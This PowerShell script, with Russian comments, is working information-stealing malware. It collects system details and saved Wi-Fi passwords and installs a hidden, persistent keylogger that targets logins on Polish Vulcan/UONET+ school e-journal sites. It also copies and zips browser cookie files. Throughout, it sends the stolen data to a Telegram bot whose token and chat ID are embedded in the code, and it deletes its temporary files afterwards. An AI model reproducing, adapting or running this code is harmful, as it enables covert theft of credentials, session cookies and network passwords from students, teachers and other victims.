# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# УПРОЩЕННЫЙ ИСПРАВЛЕННЫЙ КЕЙЛОГГЕР
$keyloggerScript = @"
`$ErrorActionPreference = 'SilentlyContinue'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Функция отправки в Telegram
function Send-TelegramMessage {
    param(`$message)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
    } catch { }
}

# Функция получения активного окна
function Get-ActiveWindowTitle {
    try {
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using System.Text;
        
        public class WindowHelper {
            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();
            
            [DllImport("user32.dll")]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        }
"@ -ErrorAction SilentlyContinue
        
        `$buffer = New-Object System.Text.StringBuilder(256)
        `$handle = [WindowHelper]::GetForegroundWindow()
        `$length = [WindowHelper]::GetWindowText(`$handle, `$buffer, `$buffer.Capacity)
        
        if (`$length -gt 0) {
            return `$buffer.ToString()
        }
    } catch { }
    
    return ""
}

# Функция проверки сайтов Vulcan
function Test-VulcanSite {
    param(`$windowTitle)
    
    if ([string]::IsNullOrEmpty(`$windowTitle)) { return `$false }
    
    `$vulcanKeywords = @(
        "vulcan", "uonet", "dziennik", "edu.gdynia", "eszkola", 
        "logowanie", "login", "account", "uczen", "nauczyciel",
        "cufs", "uonetplus", "dziennik elektroniczny"
    )
    
    foreach (`$keyword in `$vulcanKeywords) {
        if (`$windowTitle.ToLower().Contains(`$keyword.ToLower())) {
            return `$true
        }
    }
    
    return `$false
}

# Основной цикл кейлоггера
`$buffer = ""
`$lastWindow = ""
`$lastSendTime = Get-Date
`$isMonitoring = `$false

Send-TelegramMessage "VULCAN KEYLOGGER STARTED - Monitoring system initialized"

while (`$true) {
    try {
        # Получаем активное окно
        `$currentWindow = Get-ActiveWindowTitle
        `$isVulcanSite = Test-VulcanSite -windowTitle `$currentWindow
        
        if (`$isVulcanSite) {
            if (-not `$isMonitoring -or `$currentWindow -ne `$lastWindow) {
                `$isMonitoring = `$true
                `$lastWindow = `$currentWindow
                Send-TelegramMessage "VULCAN SITE DETECTED: `$currentWindow"
            }
            
            # Проверяем нажатия клавиш
            for (`$i = 8; `$i -le 254; `$i++) {
                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                
                if (`$keyState -eq -32767) {
                    `$key = [System.Windows.Forms.Keys]`$i
                    
                    # Обработка специальных клавиш
                    switch (`$key) {
                        "Enter" { 
                            if (`$buffer.Length -gt 0) {
                                Send-TelegramMessage "VULCAN INPUT [ENTER]: `$buffer"
                                `$buffer = ""
                            }
                        }
                        "Space" { 
                            `$buffer += " " 
                        }
                        "Back" { 
                            if (`$buffer.Length -gt 0) { 
                                `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
                            }
                        }
                        "Tab" { 
                            `$buffer += "[TAB]"
                            if (`$buffer.Length -gt 0) {
                                Send-TelegramMessage "VULCAN INPUT [TAB]: `$buffer"
                                `$buffer = ""
                            }
                        }
                        "LButton" { 
                            # Левый клик - отправляем буфер
                            if (`$buffer.Length -gt 0) {
                                Send-TelegramMessage "VULCAN INPUT [CLICK]: `$buffer"
                                `$buffer = ""
                            }
                        }
                        "RButton" { 
                            # Правый клик - отправляем буфер
                            if (`$buffer.Length -gt 0) {
                                Send-TelegramMessage "VULCAN INPUT [RCLICK]: `$buffer"
                                `$buffer = ""
                            }
                        }
                        "LShiftKey" { }
                        "RShiftKey" { }
                        "ShiftKey" { }
                        "ControlKey" { }
                        "LControlKey" { }
                        "RControlKey" { }
                        "LMenu" { }
                        "RMenu" { }
                        "Capital" { }
                        "NumLock" { }
                        "Scroll" { }
                        default {
                            # Обработка обычных символов
                            `$isShift = ([System.Windows.Forms.GetAsyncKeyState]160 -eq -32767) -or ([System.Windows.Forms.GetAsyncKeyState]161 -eq -32767)
                            `$isCapsLock = [System.Console]::CapsLock
                            
                            # Буквы A-Z
                            if (`$key -ge [System.Windows.Forms.Keys]::A -and `$key -le [System.Windows.Forms.Keys]::Z) {
                                if ((`$isShift -and -not `$isCapsLock) -or (-not `$isShift -and `$isCapsLock)) {
                                    `$buffer += `$key.ToString()
                                } else {
                                    `$buffer += `$key.ToString().ToLower()
                                }
                            }
                            # Цифры 0-9
                            elseif (`$key -ge [System.Windows.Forms.Keys]::D0 -and `$key -le [System.Windows.Forms.Keys]::D9) {
                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                                if (`$isShift) {
                                    `$buffer += `$symbols[`$key - [System.Windows.Forms.Keys]::D0]
                                } else {
                                    `$buffer += (`$key - [System.Windows.Forms.Keys]::D0).ToString()
                                }
                            }
                            # Специальные символы
                            else {
                                switch (`$key) {
                                    "OemPeriod" { `$buffer += "." }
                                    "Oemcomma" { `$buffer += "," }
                                    "OemQuestion" { `$buffer += if (`$isShift) { "?" } else { "/" } }
                                    "Oemtilde" { `$buffer += if (`$isShift) { "~" } else { "`" } }
                                    "OemOpenBrackets" { `$buffer += if (`$isShift) { "{" } else { "[" } }
                                    "OemCloseBrackets" { `$buffer += if (`$isShift) { "}" } else { "]" } }
                                    "OemPipe" { `$buffer += if (`$isShift) { "|" } else { "\" } }
                                    "OemMinus" { `$buffer += if (`$isShift) { "_" } else { "-" } }
                                    "Oemplus" { `$buffer += if (`$isShift) { "+" } else { "=" } }
                                    "OemSemicolon" { `$buffer += if (`$isShift) { ":" } else { ";" } }
                                    "OemQuotes" { `$buffer += if (`$isShift) { "`"" } else { "'" } }
                                    "Decimal" { `$buffer += "." }
                                    "Divide" { `$buffer += "/" }
                                    "Multiply" { `$buffer += "*" }
                                    "Subtract" { `$buffer += "-" }
                                    "Add" { `$buffer += "+" }
                                }
                            }
                        }
                    }
                    
                    # Автоматическая отправка при длинном вводе
                    if (`$buffer.Length -ge 30) {
                        Send-TelegramMessage "VULCAN INPUT [AUTO]: `$buffer"
                        `$buffer = ""
                        `$lastSendTime = Get-Date
                    }
                }
            }
        } else {
            # Если ушли с сайта Vulcan - отправляем оставшиеся данные
            if (`$isMonitoring -and `$buffer.Length -gt 0) {
                Send-TelegramMessage "VULCAN INPUT [LEAVE]: `$buffer"
                `$buffer = ""
            }
            `$isMonitoring = `$false
        }
        
        # Автоматическая отправка каждые 15 секунд
        if ((Get-Date) - `$lastSendTime -gt [TimeSpan]::FromSeconds(15)) {
            if (`$buffer.Length -gt 0) {
                Send-TelegramMessage "VULCAN INPUT [TIMEOUT]: `$buffer"
                `$buffer = ""
            }
            `$lastSendTime = Get-Date
        }
        
    } catch {
        # Игнорируем ошибки для непрерывной работы
    }
    
    Start-Sleep -Milliseconds 10
}
"@

# Сохраняем и запускаем исправленный кейлоггер
try {
    $keyloggerPath = "$env:TEMP\vulcan_monitor.ps1"
    $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
    
    # Запускаем в отдельном процессе
    $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"" -PassThru
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
    Set-ItemProperty -Path $startupPath -Name "WindowsMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "KEYLOGGER ACTIVE - Monitoring Vulcan sites (PowerShell version)"
    
    # Тестовая отправка
    Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{
        chat_id = '5674514050'
        text = "SYSTEM SCAN COMPLETED - Keylogger initialized and monitoring Vulcan sites"
    }
    
} catch {
    $keyloggerStatus = "Keylogger setup failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Cookies - создаем ZIP архив для удобной загрузки
$cookies = @()
$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"

New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Копируем файлы cookies
$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
)

foreach ($browser in $browsers) {
    if ($browser.Path -and (Test-Path $browser.Path)) {
        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookies += $dest
            # Создаем текстовую информацию о файле
            $fileInfo = Get-Item $dest
            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
            $cookies += "$temp\$($browser.Name)_info.txt"
        }
    }
}

# Создаем ZIP архив с cookies
try {
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
        if (Test-Path $zipPath) {
            $cookies += $zipPath
        }
    }
} catch {}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== KEYLOGGER STATUS ===
$keyloggerStatus

=== TARGET SITES ===
• https://cufs.vulcan.net.pl/minrol/Account/LogOn
• Все сайты Vulcan/UONET+
• Страницы входа в дневник

=== BROWSER COOKIES ===
Found cookies files: $($cookies.Count)
Files available for download as ZIP archive

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Отправка ZIP архива с cookies
if (Test-Path $zipPath) {
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
            chat_id = '5674514050'
            document = [System.IO.File]::OpenRead($zipPath)
            caption = "COOKIES ARCHIVE - Download and extract to view cookies files"
        }
    } catch {
        # Если не удалось отправить ZIP, отправляем файлы по отдельности
        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                    chat_id = '5674514050'
                    document = [System.IO.File]::OpenRead($_)
                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
                }
            } catch {}
        }
    }
} else {
    # Отправка отдельных файлов если ZIP не создался
    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($_)
                caption = "Cookies file: $(Split-Path $_ -Leaf)"
            }
        } catch {}
    }
}

# Очистка
Start-Sleep 2
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
